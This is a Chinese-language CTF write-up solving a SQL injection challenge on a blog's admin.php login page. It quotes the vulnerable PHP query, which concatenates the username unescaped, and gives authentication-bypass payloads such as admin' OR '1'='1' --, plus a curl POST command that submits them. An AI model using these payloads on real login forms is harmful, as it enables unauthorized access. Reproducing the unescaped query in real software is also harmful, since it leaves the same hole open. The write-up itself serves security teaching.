# CTF Web 题目 Writeup

## 1、题目描述

本题是一个博客系统的 SQL 注入漏洞利用题目。题目提供了一个管理员登录页面（admin.php），需要通过 SQL 注入绕过身份验证获取 FLAG。

## 2、知识点

- **SQL 注入**：通过构造恶意 SQL 语句绕过身份验证
- **认证绕过**：利用 SQL 注入绕过登录验证机制

## 3、题目解题方法思路

### 漏洞分析

审计 admin.php 源码发现关键漏洞点：

```php
$username = $_POST['username']; #vuln
#$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = MD5($_POST['password']);

$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
```

**漏洞点**：

- `$username` 参数未经过滤直接拼接到 SQL 语句中
- 注释掉的 `mysqli_real_escape_string()` 表明本应进行转义但未执行
- 存在经典的 SQL 注入漏洞

**利用思路**：

- 通过在 username 字段注入恶意 SQL 代码
- 使用 `' OR '1'='1` 等万能密码绕过验证
- 使 SQL 查询返回至少一条记录，从而 `$result->num_rows == 1` 条件满足
- 成功设置 session 并获取 FLAG

**使用工具**：

- 浏览器（或 Burp Suite 进行请求修改）
- URL 编码工具

## 4、解题步骤

### 步骤 1：访问管理员登录页面

访问 `http://target-url/admin.php`，查看登录表单。

### 步骤 2：分析源码漏洞

通过审计源码发现：

- username 参数存在 SQL 注入
- 密码使用 MD5 加密，但可以通过注释符绕过密码验证

### 步骤 3：构造 SQL 注入 Payload

构造以下 Payload 注入到 username 字段：

```
admin' OR '1'='1' --
```

或者：

```
' OR 1=1 --
```

### 步骤 4：提交注入请求

在登录表单中输入：

- **Username**: `admin' OR '1'='1' -- `
- **Password**: 任意值（如：`123456`）

注入后的 SQL 语句变为：

```sql
SELECT id FROM admins WHERE username = 'admin' OR '1'='1' -- ' AND password = 'md5_hash'
```

`--` 后面的内容被注释，密码验证被绕过。

### 步骤 5：获取 FLAG

提交后，SQL 查询返回结果，`num_rows >= 1`，成功设置 session，页面输出 `@FLAG@`。

## 5、EXP

### 方法一：使用浏览器直接提交

访问以下 URL（POST 请求）：

```
http://target-url/admin.php
```

POST 数据：

```
username=admin' OR '1'='1' -- &password=123456
```

### 方法二：使用 curl 命令

```bash
curl -X POST http://target-url/admin.php \
  -d "username=admin' OR '1'='1' -- &password=123456" \
  -L
```

成功注入后即可获取真正的 FLAG 。
